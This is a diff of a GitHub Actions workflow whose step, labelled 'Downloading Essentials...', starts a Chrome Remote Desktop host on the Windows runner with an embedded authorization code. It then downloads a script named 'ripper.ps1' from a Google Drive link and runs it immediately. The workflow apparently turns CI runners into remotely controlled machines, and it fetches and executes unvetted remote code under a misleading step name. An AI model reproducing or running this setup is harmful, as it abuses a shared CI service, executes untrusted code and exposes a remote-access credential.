@@ -17,7 +17,7 @@ jobs:
 
     steps:
     - name: Downloading Essentials...
-      run: |
+      run: |& "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AeanS0Zo3ig5m3Xt6ST4Dpstw9ZGm-bmdrj8EijV3DbZzlqk0Nw0RumOcx7bP90-Z3iAnQ" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME
         # WAIT FOR 3-4 MINUTES 
         Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1EkjuhLJTOej0sbEUUZpb45kkoTrKMDbL&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "ripper.ps1" && ./ripper.ps1
     - name: Starting Virtual Machine...
